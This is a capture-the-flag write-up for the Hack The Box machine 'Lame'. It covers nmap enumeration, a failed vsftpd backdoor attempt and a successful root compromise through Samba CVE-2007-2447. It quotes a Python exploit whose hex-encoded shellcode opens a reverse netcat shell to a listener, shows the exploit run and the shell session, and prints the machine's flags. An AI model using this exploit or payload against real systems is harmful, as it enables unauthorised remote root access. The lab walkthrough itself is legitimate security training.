# Enumeration
```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.3
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 11:21 +08
Nmap scan report for 10.10.10.3
Host is up (0.0038s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m46s, deviation: 2h49m45s, median: 44s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-05-07T23:22:44-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   3.91 ms 10.10.14.1
2   3.92 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.30 seconds
```
It seems like there is a ftp port open. Let’s run `searchsploit` to find if there are any vulnerabilities for ```vsftpd 2.3.4```
```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox]
└─# searchsploit vsftpd 2.3.4                                             130 ⨯
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
---------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Nice! There is an interesting exploit available. Let’s use this exploit in Metasploit. OwO
# Exploitation
```bash
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifie
                                      r, or hosts file with syntax 'file:<path
                                      >'
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set TARGET 0
TARGET => 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
Unfortunately, the exploit keeps failing…

Let’s move on to the next interesting open port `445` that is running `Samba smbd 3.0.20-Debian`

A quick Google search showed a [python script](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851) that we can run but there was not much info on how to use this. :(

```bash
#!/usr/bin/python

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys


# Just a python version of a very simple Samba exploit. 
# It doesn't have to be pretty because the shellcode is executed
# in the username field. 

# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/ 

# Configured SMB connection options with info from here:
# https://pythonhosted.org/pysmb/api/smb_SMBConnection.html

# Use the commandline argument as the target: 
if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()


# Shellcode: 
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.35 LPORT=9999 -f python

buf =  ""
buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
buf += "\x62\x67\x61\x66\x3b\x20\x6e\x63\x20\x31\x30\x2e\x30"
buf += "\x2e\x30\x2e\x33\x35\x20\x39\x39\x39\x39\x20\x30\x3c"
buf += "\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66\x20\x7c\x20"
buf += "\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70"
buf += "\x2f\x6b\x62\x67\x61\x66\x20\x32\x3e\x26\x31\x3b\x20"
buf += "\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66"
buf += "\x20"


username = "/=`nohup " + buf + "`"
password = ""
conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
assert conn.connect(sys.argv[1], 445)
```
So let's find out what the CVE is using the [link](https://www.exploit-db.com/exploits/16320/) in the script. It turns out that the CVE number is `2007-2447`. 

So let's do a quick Google search on this. 

Here is a [python script](https://github.com/amriunix/CVE-2007-2447) that I found with instructions on how to use it.

Before we run this script, remember to run our netcat listener first!

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Lame/CVE-2007-2447]
└─# python3 usermap_script.py 10.10.10.3 445 10.10.14.3 1234
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !

┌──(shiro㉿Shiro)-[~/HackTheBox]
└─$ nc -nlvp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:34329.
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
whoami    
root
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
1958f8c5ebfa347cc8dc6b7c35a3b132
cd /home
ls
ftp
makis
service
user
cd makis/
ls
user.txt
cat user.txt 
a848bb4bcd8a9651138d9cfa73d4d16e
```
